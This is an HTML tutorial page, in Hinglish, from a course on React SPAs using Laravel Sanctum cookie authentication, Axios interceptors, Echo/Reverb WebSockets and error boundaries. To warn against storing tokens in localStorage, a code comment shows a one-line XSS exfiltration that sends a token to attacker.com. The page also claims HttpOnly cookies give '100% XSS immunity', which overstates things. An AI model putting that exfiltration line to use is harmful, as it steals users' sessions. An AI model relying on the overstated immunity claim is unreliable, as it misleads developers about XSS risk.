@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>React Mastery - Decoupled SPA with Laravel Sanctum &amp; WebSockets</title>
+    <link rel="stylesheet" href="./style.css">
+    <script src="./marked.min.js"></script>
+</head>
+<body>
+    <div class="nav-bar">
+        <a href="06_Global_State_Management_Context_and_Zustand.html" class="nav-btn">&larr; Previous: Global State</a>
+        <a href="../index.html" class="nav-btn hub-btn">&#127968; Hub Index</a>
+        <a href="08_Custom_Hooks_and_Scalable_Component_Architecture.html" class="nav-btn">Next: Custom Hooks &amp; Architecture &rarr;</a>
+    </div>
+
+    <div id="content"></div>
+
+    <!-- Interactive: Sanctum Cookie Handshake & WebSocket Auth Pipeline Stepper -->
+    <div class="lifecycle-stepper">
+        <h4 style="margin-top:0; border:none;">Interactive: Sanctum Cookie Handshake &amp; WebSocket Auth Pipeline</h4>
+        <p style="color:var(--text-muted); font-size:0.95rem;">
+            CSRF cookie initialization se lekar authenticated WebSocket channel handshake tak ka 6-step protocol:
+        </p>
+
+        <div class="stepper-nav" id="sanctumNav">
+            <button class="step-chip active" onclick="showSanctumStep(0)">
+                <span class="step-num">01</span>
+                <span>CSRF Handshake</span>
+            </button>
+            <button class="step-chip" onclick="showSanctumStep(1)">
+                <span class="step-num">02</span>
+                <span>Cookie Login</span>
+            </button>
+            <button class="step-chip" onclick="showSanctumStep(2)">
+                <span class="step-num">03</span>
+                <span>Axios Interceptor</span>
+            </button>
+            <button class="step-chip" onclick="showSanctumStep(3)">
+                <span class="step-num">04</span>
+                <span>Echo Connect</span>
+            </button>
+            <button class="step-chip" onclick="showSanctumStep(4)">
+                <span class="step-num">05</span>
+                <span>Channel Auth</span>
+            </button>
+            <button class="step-chip" onclick="showSanctumStep(5)">
+                <span class="step-num">06</span>
+                <span>Live Listener</span>
+            </button>
+        </div>
+
+        <div class="step-content-box" id="sanctumContent"></div>
+    </div>
+
+    <!-- Lab Tabs -->
+    <div class="tab-container">
+        <div class="tab-header">
+            <button class="tab-btn active" onclick="switchSanctumTab(event, 'tab-axios-suite')">&#128737;&#65039; Axios Interceptor Suite</button>
+            <button class="tab-btn" onclick="switchSanctumTab(event, 'tab-cookie-flow')">&#127850; Sanctum Cookie Flow</button>
+            <button class="tab-btn" onclick="switchSanctumTab(event, 'tab-echo-reverb')">&#128225; Echo + Reverb Template</button>
+            <button class="tab-btn" onclick="switchSanctumTab(event, 'tab-error-boundary')">&#128680; React Error Boundary</button>
+        </div>
+
+        <!-- Tab 1: Axios Interceptors -->
+        <div id="tab-axios-suite" class="tab-panel active">
+            <h5>Production Axios Client Setup (Auto-CSRF &amp; 401 Handling)</h5>
+            <p style="color:var(--text-muted); font-size:0.95rem;">
+                Standard HTTP client for decoupled SPAs connecting to Laravel 11:
+            </p>
+            <pre><code class="language-javascript">import axios from 'axios';
+
+const api = axios.create({
+    baseURL: import.meta.env.VITE_API_URL || 'http://localhost:8000',
+    withCredentials: true,
+    withXSRFToken: true,
+    headers: { 'Accept': 'application/json' },
+});
+
+api.interceptors.response.use(
+    response => response,
+    async error => {
+        if (error.response?.status === 401) {
+            window.location.href = '/login';
+        }
+        if (error.response?.status === 419) {
+            await axios.get(&#96;${api.defaults.baseURL}/sanctum/csrf-cookie&#96;, { withCredentials: true });
+            return api(error.config); // Retry original request
+        }
+        return Promise.reject(error);
+    }
+);
+
+export default api;</code></pre>
+        </div>
+
+        <!-- Tab 2: Sanctum Cookie Flow -->
+        <div id="tab-cookie-flow" class="tab-panel">
+            <h5>Laravel Sanctum Stateful Cookie Architecture</h5>
+            <p style="color:var(--text-muted); font-size:0.95rem;">
+                Why HttpOnly cookies eliminate 100% of localStorage XSS theft risks:
+            </p>
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>Feature</th>
+                        <th>Bearer Token in LocalStorage</th>
+                        <th>Sanctum HttpOnly Cookie (Recommended)</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>XSS Attack Vulnerability</strong></td>
+                        <td><span style="color:#e11d48; font-weight:bold;">100% Vulnerable</span> (Accessible via <code>localStorage.getItem</code>)</td>
+                        <td><span style="color:#16a34a; font-weight:bold;">100% Immune</span> (Browser blocks JS access to cookie)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>CSRF Protection</strong></td>
+                        <td>Not vulnerable to CSRF, but vulnerable to XSS</td>
+                        <td>Protected by Laravel's built-in <code>VerifyCsrfToken</code> middleware</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Token Expiry Handling</strong></td>
+                        <td>Must implement complex manual refresh tokens in JS</td>
+                        <td>Handled natively by Laravel Session lifetime configuration</td>
+                    </tr>
+                    <tr>
+                        <td><strong>CORS Configuration</strong></td>
+                        <td>Simple (Headers only)</td>
+                        <td>Requires <code>SANCTUM_STATEFUL_DOMAINS</code> in <code>.env</code></td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- Tab 3: Echo + Reverb Template -->
+        <div id="tab-echo-reverb" class="tab-panel">
+            <h5>Laravel Echo + Laravel Reverb WebSocket Template</h5>
+            <p style="color:var(--text-muted); font-size:0.95rem;">
+                Complete React hook integration with private channel authorization and automatic teardown:
+            </p>
+            <pre><code class="language-jsx">import React, { useState, useEffect } from 'react';
+import { echo } from '@/echo';
+
+export function LiveChat({ roomId }) {
+    const [messages, setMessages] = useState([]);
+
+    useEffect(() => {
+        const channelName = &#96;chat.room.${roomId}&#96;;
+
+        // 1. Subscribe to channel:
+        echo.private(channelName)
+            .listen('.NewChatMessage', (e) => {
+                setMessages(prev => [...prev, e.message]);
+            });
+
+        // 2. MANDATORY CLEANUP on unmount or roomId change:
+        return () => {
+            echo.leave(channelName);
+        };
+    }, [roomId]);
+
+    return (
+        &lt;div&gt;
+            {messages.map(m =&gt; &lt;div key={m.id}&gt;{m.text}&lt;/div&gt;)}
+        &lt;/div&gt;
+    );
+}</code></pre>
+        </div>
+
+        <!-- Tab 4: Error Boundary -->
+        <div id="tab-error-boundary" class="tab-panel">
+            <h5>React Error Boundary — Preventing White Screen of Death</h5>
+            <p style="color:var(--text-muted); font-size:0.95rem;">
+                Catch runtime rendering exceptions and display a graceful recovery interface:
+            </p>
+            <pre><code class="language-jsx">export class ErrorBoundary extends React.Component {
+    state = { hasError: false };
+
+    static getDerivedStateFromError(error) {
+        return { hasError: true };
+    }
+
+    componentDidCatch(error, info) {
+        console.error("Crash logged to Sentry:", error, info);
+    }
+
+    render() {
+        if (this.state.hasError) {
+            return (
+                &lt;div className="alert-box"&gt;
+                    &lt;h3&gt;Application Encountered an Error&lt;/h3&gt;
+                    &lt;button onClick={() =&gt; window.location.reload()}&gt;
+                        Reload Application
+                    &lt;/button&gt;
+                &lt;/div&gt;
+            );
+        }
+        return this.props.children;
+    }
+}</code></pre>
+        </div>
+    </div>
+
+    <div class="nav-bar">
+        <a href="06_Global_State_Management_Context_and_Zustand.html" class="nav-btn">&larr; Previous: Global State</a>
+        <a href="../index.html" class="nav-btn hub-btn">&#127968; Hub Index</a>
+        <a href="08_Custom_Hooks_and_Scalable_Component_Architecture.html" class="nav-btn">Next: Custom Hooks &amp; Architecture &rarr;</a>
+    </div>
+
+    <textarea id="markdown-content" style="display:none; white-space:pre;">
+### React Mastery 7: Decoupled SPA with Laravel Sanctum & WebSockets (Reverb / Pusher)
+
+> *"Separate React SPA (Vite / Next.js) + Laravel REST API Backend — Secure Authentication & Real-Time Push"*
+
+Jab enterprise applications mein alag frontend team hoti hai, ya ek hi Laravel API ko Web SPA, iOS app, aur Android app teeno consume kar rahe hote hain, to aap **Decoupled Architecture** use karte hain:
+- **Backend:** Laravel 11 REST API (running on `api.myapp.com` or port 8000)
+- **Frontend:** React 18 SPA (running on `app.myapp.com` or port 3000)
+
+Is decoupled architecture mein do sabse bade challenges aate hain:
+1. **Authentication Security:** Browser mein JWT / Bearer Token ko `localStorage` mein store karna ek deadly **XSS Security Hole** hai.
+2. **Real-time Synchronization:** Data change hone par page refresh ke bina real-time notifications aur live chats dikhana.
+
+Is module mein hum master karenge:
+- **Laravel Sanctum SPA Cookie Authentication** (Zero localStorage, 100% XSS immunity)
+- **Production Axios Client with Interceptors** (Auto CSRF, 401 auto-redirect, 419 retry)
+- **Laravel Echo + Reverb / Pusher** in React (`useEffect` channel listeners)
+- **Private Channel Authorization** & Clean WebSocket Teardown
+- **React Error Boundaries** for bulletproof client resilience
+
+---
+
+#### 1. Why NOT Store Tokens in `localStorage`? (The XSS Vulnerability)
+
+Bohot se developers frontend SPA mein login ke baad aane wale API token ko `localStorage.setItem('token', token)` mein daal dete hain:
+
+```javascript
+// ❌ CRITICAL SECURITY VULNERABILITY:
+localStorage.setItem('auth_token', token);
+// Agar koi third-party npm package, malicious ad, ya XSS vulnerability aayi,
+// to attacker 1 line of JS se aapka token chura lega:
+// fetch('https://attacker.com/steal?token=' + localStorage.getItem('auth_token'));
+```
+
+##### The Enterprise Solution: Laravel Sanctum Cookie-Based SPA Auth
+Sanctum browser SPAs ke liye **Stateful Cookie Authentication** use karta hai:
+- Laravel session cookie ko **`HttpOnly`** mark karta hai.
+- **`HttpOnly` cookie ko JavaScript se access hi nahi kiya ja sakta!** Attacker XSS inject kar bhi le, to bhi cookie chura nahi sakta.
+- Browser har subsequent Axios call par cookie automatically attach karta hai!
+
+---
+
+#### 2. The 3-Step Sanctum SPA Cookie Handshake
+
+##### Step 1: Fetch CSRF Cookie Before Login:
+Pehla kaam: Laravel ko bolo ki ek fresh CSRF cookie issue kare:
+```javascript
+await axios.get('http://api.myapp.com/sanctum/csrf-cookie', {
+    withCredentials: true // MANDATORY: Allows browser to save cookies
+});
+```
+
+##### Step 2: Post Credentials to Login:
+```javascript
+const response = await axios.post('http://api.myapp.com/login', {
+    email: 'user@example.com',
+    password: 'password123'
+}, {
+    withCredentials: true
+});
+```
+- Laravel session create karta hai aur response headers mein `Set-Cookie: laravel_session=...; HttpOnly; SameSite=Lax` bhejta hai.
+
+##### Step 3: Fetch Authenticated User:
+```javascript
+// Any subsequent call automatically sends the session cookie!
+const userResponse = await axios.get('http://api.myapp.com/api/user', {
+    withCredentials: true
+});
+```
+
+---
+
+#### 3. Production Axios Client with Interceptors
+
+Har API call par manually `withCredentials: true` likhna galti ka bais ban sakta hai. Production mein ek dedicated `api.js` client banayein:
+
+```javascript
+// resources/js/Services/api.js
+import axios from 'axios';
+
+const api = axios.create({
+    baseURL: import.meta.env.VITE_API_BASE_URL || 'http://localhost:8000',
+    withCredentials: true, // Auto-send cookies
+    withXSRFToken: true,   // Auto-send X-XSRF-TOKEN header from cookie
+    headers: {
+        'Accept': 'application/json',
+        'X-Requested-With': 'XMLHttpRequest',
+    },
+});
+
+// Response Interceptor: Global Error Handling
+api.interceptors.response.use(
+    (response) => response,
+    async (error) => {
+        const { status } = error.response || {};
+
+        // 1. Session Expired (401 Unauthorized):
+        if (status === 401) {
+            window.location.href = '/login';
+            return Promise.reject(error);
+        }
+
+        // 2. CSRF Token Mismatched (419 Page Expired):
+        if (status === 419) {
+            console.warn('CSRF token expired. Refreshing token and retrying...');
+            await axios.get('http://localhost:8000/sanctum/csrf-cookie', { withCredentials: true });
+            // Retry the original failed request:
+            return api(error.config);
+        }
+
+        // 3. Server Crash (500):
+        if (status >= 500) {
+            console.error('Critical server error. Please try again later.');
+        }
+
+        return Promise.reject(error);
+    }
+);
+
+export default api;
+```
+
+---
+
+#### 4. Real-Time WebSockets: Laravel Echo + Reverb / Pusher
+
+Laravel 11 ne **Laravel Reverb** introduce kiya hai — ek ultra-fast, native PHP WebSocket server.
+
+##### Installation:
+```bash
+npm install laravel-echo pusher-js
+```
+
+##### Echo Client Setup (`resources/js/echo.js`):
+```javascript
+import Echo from 'laravel-echo';
+import Pusher from 'pusher-js';
+import api from './Services/api';
+
+window.Pusher = Pusher;
+
+export const echo = new Echo({
+    broadcaster: 'reverb',
+    key: import.meta.env.VITE_REVERB_APP_KEY,
+    wsHost: import.meta.env.VITE_REVERB_HOST || 'localhost',
+    wsPort: import.meta.env.VITE_REVERB_PORT || 8080,
+    wssPort: import.meta.env.VITE_REVERB_PORT || 8080,
+    forceTLS: (import.meta.env.VITE_REVERB_SCHEME ?? 'https') === 'https',
+    enabledTransports: ['ws', 'wss'],
+
+    // Custom Authorizer for Private & Presence Channels:
+    authorizer: (channel) => ({
+        authorize: (socketId, callback) => {
+            api.post('/broadcasting/auth', {
+                socket_id: socketId,
+                channel_name: channel.name,
+            })
+            .then(res => callback(null, res.data))
+            .catch(err => callback(err));
+        }
+    })
+});
+```
+
+---
+
+#### 5. Listening to Channels in React (`useEffect` & Cleanups)
+
+React component ke andar WebSocket listener lagate waqt **Cleanup Function (`echo.leaveChannel`) mandatory hai!**
+Agar aap cleanup nahi karenge, to har re-render par naya listener judta jayega aur 1 notification aane par user ko 10 alert popups dikhenge!
+
+##### Example: Real-Time Order Notifications:
+```jsx
+import React, { useState, useEffect } from 'react';
+import { echo } from '@/echo';
+import api from '@/Services/api';
+
+export default function UserNotifications({ userId }) {
+    const [notifications, setNotifications] = useState([]);
+
+    useEffect(() => {
+        // 1. Fetch initial notifications from Laravel REST API:
+        api.get('/api/notifications').then(res => setNotifications(res.data));
+
+        // 2. Subscribe to authenticated Private Channel:
+        const channelName = `App.Models.User.${userId}`;
+        
+        echo.private(channelName)
+            .listen('.OrderShipped', (event) => {
+                console.log('Real-time order shipped event received!', event);
+                
+                // Add new notification to top of list immutably:
+                setNotifications(prev => [event.notification, ...prev]);
+            });
+
+        // 3. MANDATORY TEARDOWN CLEANUP:
+        return () => {
+            console.log(`Leaving channel: ${channelName}`);
+            echo.leave(channelName); // Unsubscribes socket channel!
+        };
+    }, [userId]);
+
+    return (
+        <div className="notifications-dropdown">
+            <h4>Live Notifications ({notifications.length})</h4>
+            <ul>
+                {notifications.map(n => (
+                    <li key={n.id} className="p-2 border-b">
+                        <strong>{n.title}</strong>: {n.body}
+                    </li>
+                ))}
+            </ul>
+        </div>
+    );
+}
+```
+
+---
+
+#### 6. React Error Boundaries (Preventing White Screen Crashes)
+
+Decoupled SPAs mein agar kisi child component mein unhandled JavaScript runtime error aata hai, to poori screen **White Screen of Death** ban jaati hai.
+
+Error Boundary ek special class component hota hai jo error catch karke friendly fallback UI dikhata hai:
+
+```jsx
+// resources/js/Components/ErrorBoundary.jsx
+import React from 'react';
+
+export default class ErrorBoundary extends React.Component {
+    constructor(props) {
+        super(props);
+        this.state = { hasError: false, error: null };
+    }
+
+    static getDerivedStateFromError(error) {
+        return { hasError: true, error };
+    }
+
+    componentDidCatch(error, errorInfo) {
+        console.error('ErrorBoundary caught error:', error, errorInfo);
+        // Optional: Send error telemetry to Sentry / Bugsnag
+    }
+
+    render() {
+        if (this.state.hasError) {
+            return (
+                <div className="p-6 bg-rose-50 border border-rose-200 rounded-xl max-w-lg mx-auto my-8 text-center">
+                    <h3 className="text-xl font-bold text-rose-800 mb-2">Something went wrong!</h3>
+                    <p className="text-sm text-rose-600 mb-4">
+                        {this.state.error?.message || 'An unexpected rendering error occurred.'}
+                    </p>
+                    <button 
+                        onClick={() => window.location.reload()} 
+                        className="px-4 py-2 bg-rose-600 hover:bg-rose-700 text-white rounded font-medium"
+                    >
+                        Reload Page
+                    </button>
+                </div>
+            );
+        }
+
+        return this.props.children;
+    }
+}
+```
+
+---
+
+#### 7. 3-Year Laravel Developer Decoupled Architecture Checklist
+
+1. 🍪 **Never store tokens in localStorage:** SPA web clients ke liye hamesha Sanctum cookie authentication use karein.
+2. 🔄 **Always call `/sanctum/csrf-cookie` first:** First app boot par CSRF cookie fetch karna zaroori hai.
+3. ⚡ **Configure Axios Interceptors:** 401 redirect aur 419 token retry centralize karein.
+4. 🛑 **Always cleanup Echo listeners (`echo.leave`):** Memory leaks aur duplicate message alerts avoid karein.
+5. 🛡️ **Wrap critical widgets in `<ErrorBoundary>`:** Ek broken widget pure dashboard ko crash na kar sake.
+
+</textarea>
+
+    <script>
+        const rawMarkdown = document.getElementById('markdown-content').value;
+        document.getElementById('content').innerHTML = marked.parse(rawMarkdown);
+
+        const sanctumSteps = [
+            {
+                title: 'Step 1: CSRF Cookie Handshake',
+                level: 'Handshake',
+                desc: 'React application boot hote hi GET /sanctum/csrf-cookie fire karti hai. Laravel response mein Set-Cookie: XSRF-TOKEN bhejta hai jise browser automatically store karta hai.',
+                code: 'await axios.get(\'http://api.myapp.com/sanctum/csrf-cookie\', {\n    withCredentials: true // Mandatory for cookie acceptance\n});'
+            },
+            {
+                title: 'Step 2: Credentials Login (HttpOnly Cookie)',
+                level: 'Authentication',
+                desc: 'React POST /login par email aur password bhejta hai. Validation pass hone par Laravel laravel_session cookie set karta hai jo HttpOnly hoti hai (JavaScript se access impossible).',
+                code: 'await api.post(\'/login\', {\n    email: \'admin@myapp.com\',\n    password: \'secret123\'\n});\n// Session cookie stored securely in browser!'
+            },
+            {
+                title: 'Step 3: Axios Interceptor Guard',
+                level: 'HTTP Interceptor',
+                desc: 'Global response interceptor har response ko monitor karta hai. Agar 401 Unauthorized aaye to seedha /login redirect karta hai, aur 419 token mismatch aane par auto-refresh karta hai.',
+                code: 'api.interceptors.response.use(res => res, async err => {\n    if (err.response?.status === 401) window.location.href = \'/login\';\n    if (err.response?.status === 419) { await refreshCsrf(); return api(err.config); }\n});'
+            },
+            {
+                title: 'Step 4: Echo Client Initialization',
+                level: 'WebSocket Daemon',
+                desc: 'Laravel Echo instance initialize hota hai aur Laravel Reverb / Pusher daemon ke sath persistent WebSocket handshake establish karta hai (ws:// or wss://).',
+                code: 'export const echo = new Echo({\n    broadcaster: \'reverb\',\n    key: import.meta.env.VITE_REVERB_APP_KEY,\n    wsHost: \'localhost\',\n    wsPort: 8080,\n});'
+            },
+            {
+                title: 'Step 5: Private Channel Authorization',
+                level: 'Auth Broadcast',
+                desc: 'Jab React component private channel (e.g. App.Models.User.42) subscribe karta hai, Echo automatically backend route /broadcasting/auth par socket_id bhej kar verify karta hai.',
+                code: '// POST /broadcasting/auth executed automatically via Axios with session cookies!\necho.private(\'orders.\' + orderId);'
+            },
+            {
+                title: 'Step 6: Real-Time Event Listener & Teardown',
+                level: 'Event Sync',
+                desc: 'Component useEffect mein .listen() laga kar incoming broadcast event ko state mein append karta hai, aur unmount hone par echo.leave() se socket cleanup karta hai.',
+                code: 'useEffect(() => {\n    const ch = \'orders.\' + id;\n    echo.private(ch).listen(\'.StatusUpdated\', e => setStatus(e.status));\n    return () => echo.leave(ch); // Zero memory leak!\n}, [id]);'
+            }
+        ];
+
+        function showSanctumStep(index) {
+            document.querySelectorAll('#sanctumNav .step-chip').forEach((c, i) => c.classList.toggle('active', i === index));
+            const step = sanctumSteps[index];
+            document.getElementById('sanctumContent').innerHTML =
+                '<div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">' +
+                    '<h5 style="margin:0;">' + step.title + '</h5>' +
+                    '<span class="badge badge-sql">' + step.level + '</span>' +
+                '</div>' +
+                '<p style="color:var(--slate-700); font-size:0.95rem; margin-bottom:12px;">' + step.desc + '</p>' +
+                '<pre style="margin:0;"><code class="language-javascript">' + step.code + '</code></pre>';
+        }
+
+        showSanctumStep(0);
+
+        function switchSanctumTab(evt, tabId) {
+            document.querySelectorAll('.tab-container .tab-btn').forEach(b => b.classList.remove('active'));
+            document.querySelectorAll('.tab-container .tab-panel').forEach(p => p.classList.remove('active'));
+            evt.currentTarget.classList.add('active');
+            document.getElementById(tabId).classList.add('active');
+        }
+    </script>
+</body>
+</html>
